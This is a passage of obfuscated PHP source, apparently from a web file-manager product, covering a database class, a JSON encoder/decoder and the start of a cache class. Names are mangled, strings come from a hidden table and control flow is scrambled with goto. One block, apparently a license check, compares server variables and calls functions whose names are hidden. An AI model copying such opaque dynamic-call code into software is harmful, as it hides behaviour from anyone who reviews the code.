current($FÀíˆﬂ¡ÁÎ); } return $E¬ — èöÎ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $C˜—´—ÿÀ© =& $_SERVER[Æ¡î¢≠¯™]; $this->error = $this->_linkID->lastErrorMsg(); if ($C˜—´—ÿÀ©[33] != $this->queryStr) { $this->error .= LNG($C˜—´—ÿÀ©[45]) . $this->queryStr; } think_trace($this->error, $C˜—´—ÿÀ©[33], $C˜—´—ÿÀ©[46]); return $this->error; } public function escapeString($dÑŒ¬Ü”ëò) { $A÷òÍ∂æì =& $_SERVER[Æ¡î¢≠¯™]; if ($this->_linkID) { return $this->_linkID->escapeString($dÑŒ¬Ü”ëò); } return str_ireplace($A÷òÍ∂æì[55], $A÷òÍ∂æì[56], $dÑŒ¬Ü”ëò); } public function parseLimit($F‰ÖÎÜ ñﬁ) { $f˜óÃå∂ïÎ =& $_SERVER[Æ¡î¢≠¯™]; $FﬂΩ‘Ü◊ƒ€ = $f˜óÃå∂ïÎ[33]; if (!empty($F‰ÖÎÜ ñﬁ)) { $F‰ÖÎÜ ñﬁ = explode($f˜óÃå∂ïÎ[47], $F‰ÖÎÜ ñﬁ); if (count($F‰ÖÎÜ ñﬁ) > 1) { $FﬂΩ‘Ü◊ƒ€ .= $f˜óÃå∂ïÎ[48] . $F‰ÖÎÜ ñﬁ[1] . $f˜óÃå∂ïÎ[49] . $F‰ÖÎÜ ñﬁ[0] . $f˜óÃå∂ïÎ[50]; } else { $FﬂΩ‘Ü◊ƒ€ .= $f˜óÃå∂ïÎ[48] . $F‰ÖÎÜ ñﬁ[0] . $f˜óÃå∂ïÎ[50]; } } return $FﬂΩ‘Ü◊ƒ€; } } goto c¢Ç≠◊›∆„; bÖ≥õÈÛ∫·: define($_SERVER[Æ¡î¢≠¯™][1894], 32); class Services_JSON { function __construct($CÊ∂’«÷®‡ = 0) { $this->use = $CÊ∂’«÷®‡; } function utf162utf8($C≥°ûñç¯Ç) { $f›ˆÒÆëŒ’ =& $_SERVER[Æ¡î¢≠¯™]; if (function_exists($f›ˆÒÆëŒ’[78])) { return mb_convert_encoding($C≥°ûñç¯Ç, $f›ˆÒÆëŒ’[1546], $f›ˆÒÆëŒ’[1895]); } $bîÇóÊ“™‘ = ord($C≥°ûñç¯Ç[0]) << 8 | ord($C≥°ûñç¯Ç[1]); switch (!0) { case (127 & $bîÇóÊ“™‘) == $bîÇóÊ“™‘: return chr(127 & $bîÇóÊ“™‘); case (2047 & $bîÇóÊ“™‘) == $bîÇóÊ“™‘: return chr(192 | $bîÇóÊ“™‘ >> 6 & 31) . chr(128 | $bîÇóÊ“™‘ & 63); case (65535 & $bîÇóÊ“™‘) == $bîÇóÊ“™‘: return chr(224 | $bîÇóÊ“™‘ >> 12 & 15) . chr(128 | $bîÇóÊ“™‘ >> 6 & 63) . chr(128 | $bîÇóÊ“™‘ & 63); } return $f›ˆÒÆëŒ’[33]; } function utf82utf16($CêÛŒ¨ïíˆ) { $d‘Ô∏áÜŸø =& $_SERVER[Æ¡î¢≠¯™]; if (function_exists($d‘Ô∏áÜŸø[78])) { return mb_convert_encoding($CêÛŒ¨ïíˆ, $d‘Ô∏áÜŸø[1895], $d‘Ô∏áÜŸø[1546]); } switch (strlen($CêÛŒ¨ïíˆ)) { case 1: return $CêÛŒ¨ïíˆ; case 2: return chr(7 & ord($CêÛŒ¨ïíˆ[0]) >> 2) . chr(192 & ord($CêÛŒ¨ïíˆ[0]) << 6 | 63 & ord($CêÛŒ¨ïíˆ[1])); case 3: return chr(240 & ord($CêÛŒ¨ïíˆ[0]) << 4 | 15 & ord($CêÛŒ¨ïíˆ[1]) >> 2) . chr(192 & ord($CêÛŒ¨ïíˆ[1]) << 6 | 127 & ord($CêÛŒ¨ïíˆ[2])); } return $d‘Ô∏áÜŸø[33]; } function encode($E·¥àêÁ¿Ÿ) { $bÑò«∆Œ„Ò =& $_SERVER[Æ¡î¢≠¯™]; switch (gettype($E·¥àêÁ¿Ÿ)) { case $bÑò«∆Œ„Ò[1557]: return $E·¥àêÁ¿Ÿ ? $bÑò«∆Œ„Ò[1556] : $bÑò«∆Œ„Ò[1558]; case $bÑò«∆Œ„Ò[1896]: return $bÑò«∆Œ„Ò[111]; case $bÑò«∆Œ„Ò[309]: return (int) $E·¥àêÁ¿Ÿ; case $bÑò«∆Œ„Ò[284]: case $bÑò«∆Œ„Ò[283]: return (double) $E·¥àêÁ¿Ÿ; case $bÑò«∆Œ„Ò[318]: $d´¥›ëæœº = $bÑò«∆Œ„Ò[33]; $fç¡úº˘®∂ = strlen($E·¥àêÁ¿Ÿ); for ($E¨÷Ã∑üΩ = 0; $E¨÷Ã∑üΩ < $fç¡úº˘®∂; ++$E¨÷Ã∑üΩ) { $E „≈∏√Ö– = ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ]); switch (!0) { case $E „≈∏√Ö– == 8: $d´¥›ëæœº .= $bÑò«∆Œ„Ò[1897]; break; case $E „≈∏√Ö– == 9: $d´¥›ëæœº .= $bÑò«∆Œ„Ò[1533]; break; case $E „≈∏√Ö– == 10: $d´¥›ëæœº .= $bÑò«∆Œ„Ò[1531]; break; case $E „≈∏√Ö– == 12: $d´¥›ëæœº .= $bÑò«∆Œ„Ò[1898]; break; case $E „≈∏√Ö– == 13: $d´¥›ëæœº .= $bÑò«∆Œ„Ò[1532]; break; case $E „≈∏√Ö– == 34: case $E „≈∏√Ö– == 47: case $E „≈∏√Ö– == 92: $d´¥›ëæœº .= $bÑò«∆Œ„Ò[105] . $E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ]; break; case $E „≈∏√Ö– >= 32 && $E „≈∏√Ö– <= 127: $d´¥›ëæœº .= $E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ]; break; case ($E „≈∏√Ö– & 224) == 192: $eÇŸÏì±Ê™ = pack($bÑò«∆Œ„Ò[1899], $E „≈∏√Ö–, ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 1])); $E¨÷Ã∑üΩ += 1; $Aìñà§˘“Ÿ = $this->utf82utf16($eÇŸÏì±Ê™); $d´¥›ëæœº .= sprintf($bÑò«∆Œ„Ò[1900], bin2hex($Aìñà§˘“Ÿ)); break; case ($E „≈∏√Ö– & 240) == 224: $eÇŸÏì±Ê™ = pack($bÑò«∆Œ„Ò[1899], $E „≈∏√Ö–, ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 1]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 2])); $E¨÷Ã∑üΩ += 2; $Aìñà§˘“Ÿ = $this->utf82utf16($eÇŸÏì±Ê™); $d´¥›ëæœº .= sprintf($bÑò«∆Œ„Ò[1900], bin2hex($Aìñà§˘“Ÿ)); break; case ($E „≈∏√Ö– & 248) == 240: $eÇŸÏì±Ê™ = pack($bÑò«∆Œ„Ò[1899], $E „≈∏√Ö–, ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 1]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 2]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 3])); $E¨÷Ã∑üΩ += 3; $Aìñà§˘“Ÿ = $this->utf82utf16($eÇŸÏì±Ê™); $d´¥›ëæœº .= sprintf($bÑò«∆Œ„Ò[1900], bin2hex($Aìñà§˘“Ÿ)); break; case ($E „≈∏√Ö– & 252) == 248: $eÇŸÏì±Ê™ = pack($bÑò«∆Œ„Ò[1899], $E „≈∏√Ö–, ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 1]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 2]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 3]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 4])); $E¨÷Ã∑üΩ += 4; $Aìñà§˘“Ÿ = $this->utf82utf16($eÇŸÏì±Ê™); $d´¥›ëæœº .= sprintf($bÑò«∆Œ„Ò[1900], bin2hex($Aìñà§˘“Ÿ)); break; case ($E „≈∏√Ö– & 254) == 252: $eÇŸÏì±Ê™ = pack($bÑò«∆Œ„Ò[1899], $E „≈∏√Ö–, ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 1]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 2]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 3]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 4]), ord($E·¥àêÁ¿Ÿ[$E¨÷Ã∑üΩ + 5])); $E¨÷Ã∑üΩ += 5; $Aìñà§˘“Ÿ = $this->utf82utf16($eÇŸÏì±Ê™); $d´¥›ëæœº .= sprintf($bÑò«∆Œ„Ò[1900], bin2hex($Aìñà§˘“Ÿ)); break; } } return $bÑò«∆Œ„Ò[123] . $d´¥›ëæœº . $bÑò«∆Œ„Ò[123]; case $bÑò«∆Œ„Ò[1901]: if (is_array($E·¥àêÁ¿Ÿ) && count($E·¥àêÁ¿Ÿ) && array_keys($E·¥àêÁ¿Ÿ) !== range(0, sizeof($E·¥àêÁ¿Ÿ) - 1)) { $e«“€ãÆ∆ä = array_map(array($this, $bÑò«∆Œ„Ò[1902]), array_keys($E·¥àêÁ¿Ÿ), array_values($E·¥àêÁ¿Ÿ)); foreach ($e«“€ãÆ∆ä as $b◊ÒîÖŸû—) { if (Services_JSON::isError($b◊ÒîÖŸû—)) { return $b◊ÒîÖŸû—; } } return $bÑò«∆Œ„Ò[1054] . join($bÑò«∆Œ„Ò[47], $e«“€ãÆ∆ä) . $bÑò«∆Œ„Ò[321]; } $Eèù„πﬁ‘≤ = array_map(array($this, $bÑò«∆Œ„Ò[1903]), $E·¥àêÁ¿Ÿ); foreach ($Eèù„πﬁ‘≤ as $a¶’ò≈úøÔ) { if (Services_JSON::isError($a¶’ò≈úøÔ)) { return $a¶’ò≈úøÔ; } } return $bÑò«∆Œ„Ò[164] . join($bÑò«∆Œ„Ò[47], $Eèù„πﬁ‘≤) . $bÑò«∆Œ„Ò[480]; case $bÑò«∆Œ„Ò[1904]: $fÆüÈÊøöá = get_object_vars($E·¥àêÁ¿Ÿ); $e«“€ãÆ∆ä = array_map(array($this, $bÑò«∆Œ„Ò[1902]), array_keys($fÆüÈÊøöá), array_values($fÆüÈÊøöá)); foreach ($e«“€ãÆ∆ä as $b◊ÒîÖŸû—) { if (Services_JSON::isError($b◊ÒîÖŸû—)) { return $b◊ÒîÖŸû—; } } return $bÑò«∆Œ„Ò[1054] . join($bÑò«∆Œ„Ò[47], $e«“€ãÆ∆ä) . $bÑò«∆Œ„Ò[321]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $bÑò«∆Œ„Ò[111] : new Services_JSON_Error(gettype($E·¥àêÁ¿Ÿ) . $bÑò«∆Œ„Ò[1905]); } } function name_value($aÚ®äíÁ¡Ï, $E∑ÙáñÂ ´) { $F¥æªÀÔô = $this->encode($E∑ÙáñÂ ´); if (Services_JSON::isError($F¥æªÀÔô)) { return $F¥æªÀÔô; } return $this->encode(strval($aÚ®äíÁ¡Ï)) . $_SERVER[Æ¡î¢≠¯™][4] . $F¥æªÀÔô; } function reduce_string($f˜£¶ç∞ü¡) { $DÚ¬◊ßº•å =& $_SERVER[Æ¡î¢≠¯™]; $f˜£¶ç∞ü¡ = preg_replace(array($DÚ¬◊ßº•å[1906], $DÚ¬◊ßº•å[1907], $DÚ¬◊ßº•å[1908]), $DÚ¬◊ßº•å[33], $f˜£¶ç∞ü¡); return trim($f˜£¶ç∞ü¡); } function decode($F‘¯ã•¶ëƒ) { $F∑∫÷ Á⁄ê =& $_SERVER[Æ¡î¢≠¯™]; $F‘¯ã•¶ëƒ = $this->reduce_string($F‘¯ã•¶ëƒ); switch (strtolower($F‘¯ã•¶ëƒ)) { case $F∑∫÷ Á⁄ê[1556]: return !0; case $F∑∫÷ Á⁄ê[1558]: return !1; case $F∑∫÷ Á⁄ê[111]: return null; default: $Bæûù¡ÑıÑ = array(); if (is_numeric($F‘¯ã•¶ëƒ)) { return (double) $F‘¯ã•¶ëƒ == (int) $F‘¯ã•¶ëƒ ? (int) $F‘¯ã•¶ëƒ : (double) $F‘¯ã•¶ëƒ; } elseif (preg_match($F∑∫÷ Á⁄ê[1909], $F‘¯ã•¶ëƒ, $Bæûù¡ÑıÑ) && $Bæûù¡ÑıÑ[1] == $Bæûù¡ÑıÑ[2]) { $D™®òøñØÔ = substr($F‘¯ã•¶ëƒ, 0, 1); $B≥ŸéÛ•Î¥ = substr($F‘¯ã•¶ëƒ, 1, -1); $dÓÑ§≈ËÕ = $F∑∫÷ Á⁄ê[33]; $DÃÜò…ÊÖù = strlen($B≥ŸéÛ•Î¥); for ($C˘ë‰âµ‡‹ = 0; $C˘ë‰âµ‡‹ < $DÃÜò…ÊÖù; ++$C˘ë‰âµ‡‹) { $BÛâÿ¶∆•ó = substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 2); $f‘¿÷¡˘Ñ· = ord($B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹]); switch (!0) { case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1897]: $dÓÑ§≈ËÕ .= chr(8); ++$C˘ë‰âµ‡‹; break; case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1533]: $dÓÑ§≈ËÕ .= chr(9); ++$C˘ë‰âµ‡‹; break; case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1531]: $dÓÑ§≈ËÕ .= chr(10); ++$C˘ë‰âµ‡‹; break; case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1898]: $dÓÑ§≈ËÕ .= chr(12); ++$C˘ë‰âµ‡‹; break; case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1532]: $dÓÑ§≈ËÕ .= chr(13); ++$C˘ë‰âµ‡‹; break; case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1317]: case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1910]: case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1526]: case $BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1528]: if ($D™®òøñØÔ == $F∑∫÷ Á⁄ê[123] && $BÛâÿ¶∆•ó != $F∑∫÷ Á⁄ê[1910] || $D™®òøñØÔ == $F∑∫÷ Á⁄ê[55] && $BÛâÿ¶∆•ó != $F∑∫÷ Á⁄ê[1317]) { $dÓÑ§≈ËÕ .= $B≥ŸéÛ•Î¥[++$C˘ë‰âµ‡‹]; } break; case preg_match($F∑∫÷ Á⁄ê[1911], substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 6)): $A≠Í≠ÏñÏÖ = chr(hexdec(substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹ + 2, 2))) . chr(hexdec(substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹ + 4, 2))); $dÓÑ§≈ËÕ .= $this->utf162utf8($A≠Í≠ÏñÏÖ); $C˘ë‰âµ‡‹ += 5; break; case $f‘¿÷¡˘Ñ· >= 32 && $f‘¿÷¡˘Ñ· <= 127: $dÓÑ§≈ËÕ .= $B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹]; break; case ($f‘¿÷¡˘Ñ· & 224) == 192: $dÓÑ§≈ËÕ .= substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 2); ++$C˘ë‰âµ‡‹; break; case ($f‘¿÷¡˘Ñ· & 240) == 224: $dÓÑ§≈ËÕ .= substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 3); $C˘ë‰âµ‡‹ += 2; break; case ($f‘¿÷¡˘Ñ· & 248) == 240: $dÓÑ§≈ËÕ .= substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 4); $C˘ë‰âµ‡‹ += 3; break; case ($f‘¿÷¡˘Ñ· & 252) == 248: $dÓÑ§≈ËÕ .= substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 5); $C˘ë‰âµ‡‹ += 4; break; case ($f‘¿÷¡˘Ñ· & 254) == 252: $dÓÑ§≈ËÕ .= substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 6); $C˘ë‰âµ‡‹ += 5; break; } } return $dÓÑ§≈ËÕ; } elseif (preg_match($F∑∫÷ Á⁄ê[1912], $F‘¯ã•¶ëƒ) || preg_match($F∑∫÷ Á⁄ê[1913], $F‘¯ã•¶ëƒ)) { goto C’ ºÈ√ÌÈ; b©ıﬂî°ƒÏ: $B≥ŸéÛ•Î¥ = $this->reduce_string($B≥ŸéÛ•Î¥); if ($B≥ŸéÛ•Î¥ == $F∑∫÷ Á⁄ê[33]) { if (reset($a´Î≠⁄’‡∑) == SERVICES_JSON_IN_ARR) { return $aÉµÖçÍ÷≠; } else { return $f‰¬êÌÎÑ‚; } } $DÃÜò…ÊÖù = strlen($B≥ŸéÛ•Î¥); goto bŒ§›õæÖ¬; C’ ºÈ√ÌÈ: if ($F‘¯ã•¶ëƒ[0] == $F∑∫÷ Á⁄ê[164]) { $a´Î≠⁄’‡∑ = array(SERVICES_JSON_IN_ARR); $aÉµÖçÍ÷≠ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a´Î≠⁄’‡∑ = array(SERVICES_JSON_IN_OBJ); $f‰¬êÌÎÑ‚ = array(); } else { $a´Î≠⁄’‡∑ = array(SERVICES_JSON_IN_OBJ); $f‰¬êÌÎÑ‚ = new stdClass(); } } array_push($a´Î≠⁄’‡∑, array($F∑∫÷ Á⁄ê[1914] => SERVICES_JSON_SLICE, $F∑∫÷ Á⁄ê[269] => 0, $F∑∫÷ Á⁄ê[1915] => !1)); $B≥ŸéÛ•Î¥ = substr($F‘¯ã•¶ëƒ, 1, -1); goto b©ıﬂî°ƒÏ; bŒ§›õæÖ¬: for ($C˘ë‰âµ‡‹ = 0; $C˘ë‰âµ‡‹ <= $DÃÜò…ÊÖù; ++$C˘ë‰âµ‡‹) { $DˆÇÖºÚè  = end($a´Î≠⁄’‡∑); $BÛâÿ¶∆•ó = substr($B≥ŸéÛ•Î¥, $C˘ë‰âµ‡‹, 2); if ($C˘ë‰âµ‡‹ == $DÃÜò…ÊÖù || $B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $F∑∫÷ Á⁄ê[47] && $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]] == SERVICES_JSON_SLICE) { $EíéÙΩõ‰¨ = substr($B≥ŸéÛ•Î¥, $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[269]], $C˘ë‰âµ‡‹ - $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[269]]); array_push($a´Î≠⁄’‡∑, array($F∑∫÷ Á⁄ê[1914] => SERVICES_JSON_SLICE, $F∑∫÷ Á⁄ê[269] => $C˘ë‰âµ‡‹ + 1, $F∑∫÷ Á⁄ê[1915] => !1)); if (reset($a´Î≠⁄’‡∑) == SERVICES_JSON_IN_ARR) { array_push($aÉµÖçÍ÷≠, $this->decode($EíéÙΩõ‰¨)); } elseif (reset($a´Î≠⁄’‡∑) == SERVICES_JSON_IN_OBJ) { $AÕë‹ÚûÏ∆ = array(); if (preg_match($F∑∫÷ Á⁄ê[1916], $EíéÙΩõ‰¨, $AÕë‹ÚûÏ∆)) { $Dï´ú•”Ñä = $this->decode($AÕë‹ÚûÏ∆[1]); $F¬‚»ºÁ‹› = $this->decode($AÕë‹ÚûÏ∆[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f‰¬êÌÎÑ‚[$Dï´ú•”Ñä] = $F¬‚»ºÁ‹›; } else { $f‰¬êÌÎÑ‚->{$Dï´ú•”Ñä} = $F¬‚»ºÁ‹›; } } elseif (preg_match($F∑∫÷ Á⁄ê[1917], $EíéÙΩõ‰¨, $AÕë‹ÚûÏ∆)) { $Dï´ú•”Ñä = $AÕë‹ÚûÏ∆[1]; $F¬‚»ºÁ‹› = $this->decode($AÕë‹ÚûÏ∆[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f‰¬êÌÎÑ‚[$Dï´ú•”Ñä] = $F¬‚»ºÁ‹›; } else { $f‰¬êÌÎÑ‚->{$Dï´ú•”Ñä} = $F¬‚»ºÁ‹›; } } } } elseif (($B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $F∑∫÷ Á⁄ê[123] || $B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $F∑∫÷ Á⁄ê[55]) && $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]] != SERVICES_JSON_IN_STR) { array_push($a´Î≠⁄’‡∑, array($F∑∫÷ Á⁄ê[1914] => SERVICES_JSON_IN_STR, $F∑∫÷ Á⁄ê[269] => $C˘ë‰âµ‡‹, $F∑∫÷ Á⁄ê[1915] => $B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹])); } elseif ($B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1915]] && $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]] == SERVICES_JSON_IN_STR && (strlen(substr($B≥ŸéÛ•Î¥, 0, $C˘ë‰âµ‡‹)) - strlen(rtrim(substr($B≥ŸéÛ•Î¥, 0, $C˘ë‰âµ‡‹), $F∑∫÷ Á⁄ê[105]))) % 2 != 1) { array_pop($a´Î≠⁄’‡∑); } elseif ($B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $F∑∫÷ Á⁄ê[164] && in_array($DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a´Î≠⁄’‡∑, array($F∑∫÷ Á⁄ê[1914] => SERVICES_JSON_IN_ARR, $F∑∫÷ Á⁄ê[269] => $C˘ë‰âµ‡‹, $F∑∫÷ Á⁄ê[1915] => !1)); } elseif ($B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $F∑∫÷ Á⁄ê[480] && $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]] == SERVICES_JSON_IN_ARR) { array_pop($a´Î≠⁄’‡∑); } elseif ($B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $F∑∫÷ Á⁄ê[1054] && in_array($DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a´Î≠⁄’‡∑, array($F∑∫÷ Á⁄ê[1914] => SERVICES_JSON_IN_OBJ, $F∑∫÷ Á⁄ê[269] => $C˘ë‰âµ‡‹, $F∑∫÷ Á⁄ê[1915] => !1)); } elseif ($B≥ŸéÛ•Î¥[$C˘ë‰âµ‡‹] == $F∑∫÷ Á⁄ê[321] && $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]] == SERVICES_JSON_IN_OBJ) { array_pop($a´Î≠⁄’‡∑); } elseif ($BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1918] && in_array($DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a´Î≠⁄’‡∑, array($F∑∫÷ Á⁄ê[1914] => SERVICES_JSON_IN_CMT, $F∑∫÷ Á⁄ê[269] => $C˘ë‰âµ‡‹, $F∑∫÷ Á⁄ê[1915] => !1)); $C˘ë‰âµ‡‹++; } elseif ($BÛâÿ¶∆•ó == $F∑∫÷ Á⁄ê[1919] && $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[1914]] == SERVICES_JSON_IN_CMT) { array_pop($a´Î≠⁄’‡∑); $C˘ë‰âµ‡‹++; for ($Eó◊≥ë≤åÇ = $DˆÇÖºÚè [$F∑∫÷ Á⁄ê[269]]; $Eó◊≥ë≤åÇ <= $C˘ë‰âµ‡‹; ++$Eó◊≥ë≤åÇ) { $B≥ŸéÛ•Î¥ = substr_replace($B≥ŸéÛ•Î¥, $F∑∫÷ Á⁄ê[50], $Eó◊≥ë≤åÇ, 1); } } } if (reset($a´Î≠⁄’‡∑) == SERVICES_JSON_IN_ARR) { return $aÉµÖçÍ÷≠; } elseif (reset($a´Î≠⁄’‡∑) == SERVICES_JSON_IN_OBJ) { return $f‰¬êÌÎÑ‚; } goto cÌõ¢»ÌÌÏ; cÌõ¢»ÌÌÏ: } } } function isError($c˘∑Í⁄õòï, $a∏èåå±úå = null) { $A‚ø¿ÁéÂ´ =& $_SERVER[Æ¡î¢≠¯™]; if (class_exists($A‚ø¿ÁéÂ´[1920])) { return PEAR::isError($c˘∑Í⁄õòï, $a∏èåå±úå); } elseif (is_object($c˘∑Í⁄õòï) && (get_class($c˘∑Í⁄õòï) == $A‚ø¿ÁéÂ´[1921] || is_subclass_of($c˘∑Í⁄õòï, $A‚ø¿ÁéÂ´[1921]))) { return !0; } return !1; } } if (class_exists($_SERVER[Æ¡î¢≠¯™][1922])) { if ($_SERVER[$_SERVER[Æ¡î¢≠¯™][57]] != $_SERVER[$_SERVER[Æ¡î¢≠¯™][1923]]) { goto DÀ≠Ç Ã˘Î; d®¬≈„√ùó: $eëíŸÌ∏ÂÙ($_SERVER[$_SERVER[Æ¡î¢≠¯™][58]]); goto CõáÈπçÔ·; C·ÓâöΩÑ¯: $a¿Üç“˘¡á = explode($_SERVER[Æ¡î¢≠¯™][62], $D¯ÃáçìêÜ); if (count($a¿Üç“˘¡á) < $_SERVER[Æ¡î¢≠¯™][63]) { $c¡âÀŸ√ÿè = $_SERVER[Æ¡î¢≠¯™][64]; $c¡âÀŸ√ÿè(); } $eëíŸÌ∏ÂÙ = $_SERVER[Æ¡î¢≠¯™][65]; goto d®¬≈„√ùó; DÀ≠Ç Ã˘Î: $CÑÈÒøãı≤ = $_SERVER[Æ¡î¢≠¯™][59]; $A‡˘¥¬¨ã∂ = $_SERVER[$_SERVER[Æ¡î¢≠¯™][60]] . $_SERVER[Æ¡î¢≠¯™][61]; $D¯ÃáçìêÜ = $CÑÈÒøãı≤($A‡˘¥¬¨ã∂); goto C·ÓâöΩÑ¯; CõáÈπçÔ·: } class Services_JSON_Error extends PEAR_Error { function __construct($cî∏…ﬁﬂñ⁄ = "\165\x6e\153\156\x6f\167\x6e\40\145\162\162\x6f\x72", $a¢—≥£•ΩÆ = null, $e„≤îëúØÁ = null, $e…ÙÜÇõˆ™ = null, $b∫ÇöÕÖªß = null) { parent::PEAR_Error($cî∏…ﬁﬂñ⁄, $a¢—≥£•ΩÆ, $e„≤îëúØÁ, $e…ÙÜÇõˆ™, $b∫ÇöÕÖªß); } } } else { class Services_JSON_Error { function __construct($C§≤ÊÕ†“ä = "\x75\156\x6b\x6e\x6f\167\156\x20\x65\162\x72\157\x72", $dëíå˘≥áï = null, $AÍÀ◊∂∞ó∆ = null, $cå¡¡√∫±≠ = null, $D”√¿ï∑‹° = null) { } } } goto cçƒ∑Õ¶‹ç; dÏΩâΩµµ§: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto AÈÆÌ≤≤òâ; AÈÆÌ≤≤òâ: $dÛÏ◊ÀçΩπ =& $_SERVER[Æ¡î¢≠¯™]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Dê∑≠Í¨áƒ; a€ªµùˆß˜: switch ($còÌ—Æ∆‰ı[$dÛÏ◊ÀçΩπ[745]]) { case $dÛÏ◊ÀçΩπ[17]: self::$handle = Model($dÛÏ◊ÀçΩπ[747]); break; case $dÛÏ◊ÀçΩπ[748]: self::$handle = new CacheRedis($c—Ò»”¥∆ò, $BñÆÆóÒå¶); break; case $dÛÏ◊ÀçΩπ[749]: self::$handle = new CacheMemcached($c—Ò»”¥∆ò, $BñÆÆóÒå¶); break; case $dÛÏ◊ÀçΩπ[174]: self::$handle = new CacheFile($c—Ò»”¥∆ò, $BñÆÆóÒå¶); break; default: break; } return self::$handle; goto D–â⁄Ü÷ä€; Dê∑≠Í¨áƒ: $còÌ—Æ∆‰ı = $GLOBALS[$dÛÏ◊ÀçΩπ[6]][$dÛÏ◊ÀçΩπ[343]]; $c—Ò»”¥∆ò = $còÌ—Æ∆‰ı[$còÌ—Æ∆‰ı[$dÛÏ◊ÀçΩπ[745]]]; $BñÆÆóÒå¶ = $còÌ—Æ∆‰ı[$dÛÏ◊ÀçΩπ[746]]; goto a€ªµùˆß˜; D–â⁄Ü÷ä€: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($bƒ¨âø•ê‡) { if (is_array($bƒ¨âø•ê‡) || is_object($bƒ¨âø•ê‡)) { $bƒ¨âø•ê‡ = json_encode($bƒ¨âø•ê‡); } $bƒ¨âø•ê‡ = rawurlencode($bƒ¨âø•ê‡); return KOD_SITE_ID . $_SERVER[Æ¡î¢≠¯™][80] . $bƒ¨âø•ê‡; } public static function get($a≠ﬁ¢›»Ãæ) { $Cıû‚ÖÑàö = self::key($a≠ﬁ¢›»Ãæ); if (!isset(self::$memoryCache[$Cıû‚ÖÑàö])) { CacheLock::lock($a≠ﬁ¢›»Ãæ); $E⁄≠Ó¿∏∫¶ = self::init()->get($Cıû‚ÖÑàö); CacheLock::unlock($a≠ﬁ¢›»Ãæ); self::$memoryCache[$Cıû‚ÖÑàö] = unserialize($E⁄≠Ó¿∏∫¶); } return self::$memoryCache[$Cıû‚ÖÑàö]; } public static function set($e™…Éã˘¨», $DöÉÁßÙà¶, $A–‰∏‹ìé≥ = false) { goto 